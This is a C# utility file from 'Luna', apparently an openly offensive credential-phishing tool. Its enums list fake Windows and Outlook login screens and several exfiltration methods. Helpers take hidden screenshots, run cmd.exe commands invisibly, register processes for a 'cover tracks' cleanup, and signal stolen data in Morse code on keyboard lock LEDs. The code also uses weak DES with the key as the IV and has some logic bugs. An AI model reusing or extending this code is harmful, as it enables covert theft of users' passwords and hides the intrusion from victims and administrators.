//Copyright(C) 2016  saintcrossbow@gmail.com

//This program is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see<http://www.gnu.org/licenses/>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.IO;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing.Imaging;

namespace Luna
{
    // Standard constants and enums
    public static class Common
    {
        public enum CurtainStyle
        {
            Undefined = 0,
            Win7 = 1,
            OutlookPrompt = 2,
            GenericLogin = 3,
            WinXP = 4,
            FreezeScreen = 5
        }

        public enum ExfiltrationMethod
        {
            Undefined = 0,
            PlainTextFile = 1,
            EncryptedFile = 2,
            TelnetBanner = 3,
            Morse = 4,
            CovertRun = 5
        }

        public enum UserTilePositionMethod 
        { 
            Undefined = 0, 
            Win7 = 1 
        };

        public enum PasswordBoxStyle
        {
            Undefined = 0,
            Win7 = 1,
            OutlookPrompt = 3,
            Generic = 4
        };
    }

    // Based on https://support.microsoft.com/en-us/kb/307010
    public static class Crypto
    {
        //  Call this function to remove the key from memory after use for security.
        [System.Runtime.InteropServices.DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(ref string Destination, int Length);

        // Function to Generate a 64 bits Key.
        public static string GenerateKey()
        {
            // Create an instance of Symetric Algorithm. Key and IV is generated automatically.
            DESCryptoServiceProvider desCrypto = (DESCryptoServiceProvider)DESCryptoServiceProvider.Create();

            // Use the Automatically generated key for Encryption. 
            return ASCIIEncoding.ASCII.GetString(desCrypto.Key);
        }

        public static void EncryptFile(string dataIn, string sOutputFilename, string sKey)
        {
            FileStream fsEncrypted = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();

            DES.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(sKey);

            ICryptoTransform desencrypt = DES.CreateEncryptor();
            using (CryptoStream cryptostream = new CryptoStream(fsEncrypted, desencrypt, CryptoStreamMode.Write))
            {
                byte[] bytearrayinput = GetBytes(dataIn);
                cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
                cryptostream.Flush();
            }

        }

        public static string DecryptFile(string sInputFilename, string sKey)
        {
            string clearText = "";

            FileStream fsEncrypted = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();

            DES.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(sKey);

            ICryptoTransform desencrypt = DES.CreateDecryptor();
            using (CryptoStream cryptostream = new CryptoStream(fsEncrypted, desencrypt, CryptoStreamMode.Read))
            {
                //clearText = new StreamReader(cryptostream).ReadToEnd();
                clearText = new StreamReader(cryptostream).ReadToEnd().Replace("\0","");               
                fsEncrypted.Flush();
                fsEncrypted.Close();
            }

            return clearText; 
        }

        // These two from http://stackoverflow.com/questions/472906/how-to-get-a-consistent-byte-representation-of-strings-in-c-sharp-without-manual
        public static byte[] GetBytes(string str)
        {
            byte[] bytes = new byte[str.Length * sizeof(char)];
            System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
            return bytes;
        }

        public static string GetString(byte[] bytes)
        {
            char[] chars = new char[bytes.Length / sizeof(char)];
            System.Buffer.BlockCopy(bytes, 0, chars, 0, bytes.Length);
            return new string(chars);
        }
    }

    // Screen print
    // From http://stackoverflow.com/questions/362986/capture-the-screen-into-a-bitmap
    public static class LunaGeneral
    {
        // Full screen print saved to file
        public static void ScreenPrint(string toFile)
        {
            // Use this version to capture the full extended desktop (i.e. multiple screens)

            Bitmap screenshot = new Bitmap(SystemInformation.VirtualScreen.Width, 
                                           SystemInformation.VirtualScreen.Height, 
                                           PixelFormat.Format32bppArgb);
            Graphics screenGraph = Graphics.FromImage(screenshot);
            screenGraph.CopyFromScreen(SystemInformation.VirtualScreen.X, 
                                       SystemInformation.VirtualScreen.Y, 
                                       0, 
                                       0, 
                                       SystemInformation.VirtualScreen.Size, 
                                       CopyPixelOperation.SourceCopy);

            screenshot.Save(toFile, System.Drawing.Imaging.ImageFormat.Png);
        }

        // Return a random temporary file name
        public static string randomFile()
        {
            const string prefix = "~T";
            string fileName = "";
            Random rnd = new Random(DateTime.Now.Millisecond);

            fileName = prefix;
            for (int i = 0; i < (8 - prefix.Length); i++)
            {                
                fileName += (char)(65 + rnd.Next(25));
            }

            return fileName;
        }

        // Return the best user string
        public static string bestUserName()
        {
            string tempID = "";

            if (!String.IsNullOrEmpty(System.Environment.UserDomainName))
                tempID = Environment.UserDomainName + "\\";

            tempID += Environment.UserName;

            return tempID;
        }

        // Start a console command
        public static void startCommand(string cmd)
        {
            startCommand(cmd, false);
        }

        public static void startCommand(string cmd, bool waitForProcessToEnd)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + cmd;
            process.StartInfo = startInfo;
            if (waitForProcessToEnd)
                process.WaitForExit();
            else
                process.Start();

            // Keep track of process for clearing tracks
            CoverTracks.Instance.AddProcess(process);
        }

        // Modified from http://stackoverflow.com/questions/12333892/how-to-write-to-beginning-of-file-with-stream-writer
        // Liked it better than what I was doing. Changed to not do anything if file not there
        public static void insertText(string path, string newText)
        {
            if (File.Exists(path))
            {
                string oldText = File.ReadAllText(path);
                using (var sw = new StreamWriter(path, false))
                {
                    sw.WriteLine(newText);
                    sw.WriteLine(oldText);
                }
            }
        }

        // Returns:
        // - "" if the switch is not found or is invalid (otherwise not usable)
        // - " " if the switch is valid and has no expected return value
        // - [value] if the switch is valid and has a value
        // Suppose you can use Contains but want to check for mixed case, slash and dash
        public static string hasSwitch(string[] args, string sought)
        {
            string [] singleCommands = new string[]{"SETUP","HELP"};
            string found = ""; 

            foreach (string clItem in args)
	        {
                if (found == Convert.ToString(0))
                {
                    if (!clItem.StartsWith("/") || !clItem.StartsWith("/"))
                        found = clItem;
                    break;
                }
                else
                {
                    if (clItem.ToUpper() == ("/" + sought.ToUpper()) ||
                        clItem.ToUpper() == ("-" + sought.ToUpper()))
                    {
                        if (singleCommands.Contains(sought.ToUpper()))
                        {
                            // This is just a command without a value, so it is valid and found
                            found = " ";
                            break;
                        }
                        else
                        {
                            // Flag to say we need the next parameter
                            found = Convert.ToString(0);
                        }
                    }
                }
	        }

            if (found != Convert.ToString(0))
                return found;
            else
                return "";
        }

    }

    // A dinky morse class to display the secret data. Look: I know it is a very silly way of doing it. I just can't get out of my head
    // a Mission Impossible episode where they would do exactly that - just seems to fit the style well. 
    public static class ScrollLockMorse
    {
        private const int DASH_LENGTH = 300;
        private const int DOT_LENGTH = 100;
        private const int WAIT_LENGTH = 200;


        private static string[,] morseTranslate = new string[,] { { "A", ".-" },  { "B", "-..." },  { "C", "-.-." },  { "D", "-.." },
                                                                { "E", "." },     { "F", "..-." },  { "G", "--." },   { "H", "...." },
                                                                { "I", ".." },    { "J", ".---" },  { "K", "-.-" },   { "L", ".-.." },
                                                                { "M", "--" },    { "N", "-." },    { "O", "---" },   { "P", ".--." },
                                                                { "Q", "-.--" },  { "R", ".-." },   { "S", "..." },   { "T", "-" },
                                                                { "U", "..-" },   { "V", "...-" },  { "W", ".--" },   { "X", "-..-" },
                                                                { "Y", "-.--" },  { "Z", "--.." },  { "0", "-----" }, { "1", ".----" },
                                                                { "2", "..---" }, { "3", "...--" }, { "4", "....-" }, { "5", "....." },
                                                                { "6", "-...." }, { "7", "--..." }, { "8", "---.." }, { "9", "----." } };

        // Reset scroll lock to blank if it is on
        public static void PrepareForTx()
        {
            if (Control.IsKeyLocked(Keys.Scroll))
                SendKeys.SendWait("{SCROLLLOCK}");
        }

        public static void Dash()
        {
            ToggleCapsLock.SetCapsLock(true);
            Thread.Sleep(DASH_LENGTH);
            ToggleCapsLock.SetCapsLock(true);
        }

        public static void Dot()
        {
            ToggleCapsLock.SetCapsLock(true);
            Thread.Sleep(DOT_LENGTH);
            ToggleCapsLock.SetCapsLock(true);
        }

        // Given a string, send it via the scroll lock LED
        public static void SendMessage(string plainText)
        {
            PrepareForTx();

            for (int i = 0; i < (plainText.Length); i++)
            {
                for (int k = 0; k < morseTranslate.GetUpperBound(0); k++)
                {
                    if (morseTranslate[k,0] == plainText[i].ToString().ToUpper())
                    {
                        for (int m = 0; m < morseTranslate[k, 1].Length; m++)
                        {
                            switch (morseTranslate[k,1][m].ToString())
                            {
                                case ".":
                                    Dot();
                                    Thread.Sleep(WAIT_LENGTH);
                                    break;
                                case "-":
                                    Dash();
                                    Thread.Sleep(WAIT_LENGTH);
                                    break;
                            }
                        }
                        Thread.Sleep(WAIT_LENGTH*2);
                    }
                }
            }        
        }      
    }

    // From http://answers.unity3d.com/questions/219017/toggling-caps-lock-or-even-just-the-indicator-ligh.html
    public class ToggleCapsLock 
    { 
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
         private static extern short GetKeyState(int keyCode);
 
         [DllImport("user32.dll")]
         private static extern int GetKeyboardState(byte [] lpKeyState);
 
         [DllImport("user32.dll", EntryPoint = "keybd_event")]
         private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
 
         private const byte VK_NUMLOCK = 0x90; 
         private const byte VK_CAPSLOCK = 0x14; 
         private const uint KEYEVENTF_EXTENDEDKEY = 1; 
         private const int KEYEVENTF_KEYUP = 0x2;
         private const int KEYEVENTF_KEYDOWN = 0x0;
 
         public static bool GetNumLock()
         {    
             return (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
         }
 
         public static bool GetCapsLock()
         {    
             return (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
         }
 
         public static void SetNumLock( bool bState )
         {
             if (GetNumLock() != bState)
             {
                 keybd_event(VK_NUMLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYDOWN, 0); 
                 keybd_event(VK_NUMLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
             }
         }
 
         public static void SetCapsLock( bool bState )
         {
             if (GetCapsLock() != bState)
             {
                 keybd_event(VK_CAPSLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYDOWN, 0); 
                 keybd_event(VK_CAPSLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
             }
         }
    }

}
